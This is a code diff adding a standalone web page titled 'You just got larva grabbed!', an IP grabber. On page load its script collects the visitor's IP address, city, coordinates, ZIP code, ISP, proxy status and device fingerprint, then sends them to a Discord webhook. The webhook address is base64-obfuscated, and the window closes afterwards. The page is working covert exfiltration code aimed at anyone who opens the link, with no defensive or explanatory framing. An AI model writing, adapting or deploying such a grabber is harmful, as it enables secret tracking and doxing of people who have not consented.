@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>You just got larva grabbed!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+        }
+    </style>
+</head>
+<body>
+    <h1>oi oi oi larva grabbed!</h1>
+
+    <script>
+        function base64Decode(input) {
+            return atob(input);
+        }
+
+        const encodedWebhookUrl = 'WEBHOOKECODEDINBASE64';
+
+        async function sendToWebhook(ipAddress, locationData, providerData, additionalInfo, deviceInfo) {
+            const webhookUrl = base64Decode(encodedWebhookUrl);
+            const embedMessage = {
+                embeds: [{
+                    author: {
+                        name: "Larva Summary"
+                    },
+                    title: "Larva Grabbed.",
+                    description: `**IP Address:** ${ipAddress}\n**Location:** ${locationData}\n**Provider:** ${providerData}\n\n**Additional Info:**\n${additionalInfo}\n\n**Device Info:**\n${deviceInfo}`,
+                    thumbnail: {
+                        url: "https://cdn.discordapp.com/attachments/1281787525178064997/1281787562125426698/my-image.png?ex=66dcfd31&is=66dbabb1&hm=e2e6ed4b71bc6495e703c33d99d21c90573aae6f5f03870d2d5be28935efb30d&"
+                    }
+                }]
+            };
+
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(embedMessage),
+                });
+
+                if (response.ok) {
+                    console.log('Embed sent successfully!');
+                } else {
+                    console.error('Failed to send the embed.');
+                }
+            } catch (error) {
+                console.error('An error occurred:', error);
+            } finally {
+                window.close();
+            }
+        }
+
+        function getDeviceInfo() {
+            const plugins = Array.from(navigator.plugins).map(plugin => plugin.name).join(', ') || 'None';
+            return `
+                Screen Resolution: ${screen.width}x${screen.height}
+                User Agent: ${navigator.userAgent}
+                Platform: ${navigator.platform}
+                Language: ${navigator.language}
+                Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+                Cookies Enabled: ${navigator.cookieEnabled}
+                Plugins: ${plugins}
+            `;
+        }
+
+        window.onload = async () => {
+            const ipInfoUrl = 'https://api.ipify.org?format=json';
+            const ipDetailsUrl = 'https://ipinfo.io/json?token=IPIFYAPIKEY';
+
+            try {
+                const [ipResponse, ipDetailsResponse] = await Promise.all([
+                    fetch(ipInfoUrl),
+                    fetch(ipDetailsUrl)
+                ]);
+
+                const ipData = await ipResponse.json();
+                const ipDetailsData = await ipDetailsResponse.json();
+
+                const ipAddress = ipData.ip;
+                const locationData = `${ipDetailsData.city}, ${ipDetailsData.region}, ${ipDetailsData.country}, Lat: ${ipDetailsData.loc.split(",")[0]}, Lon: ${ipDetailsData.loc.split(",")[1]}, ZIP: ${ipDetailsData.postal}`;
+                const providerData = `${ipDetailsData.org}, ASN: ${ipDetailsData.asn}`;
+
+                const additionalInfo = `
+                    Time Zone: ${ipDetailsData.timezone}
+                    Proxy/VPN: ${ipDetailsData.proxy ? 'Yes' : 'No'}
+                    Hostname: ${ipDetailsData.hostname}
+                    Organization: ${ipDetailsData.org}
+                    Mobile Carrier: ${ipDetailsData.carrier || 'N/A'}
+                `;
+
+                const deviceInfo = getDeviceInfo();
+
+                sendToWebhook(ipAddress, locationData, providerData, additionalInfo, deviceInfo);
+            } catch (error) {
+                console.error('Failed to fetch IP address or IP details:', error);
+                window.close();
+            }
+        };
+    </script>
+</body>
+</html>
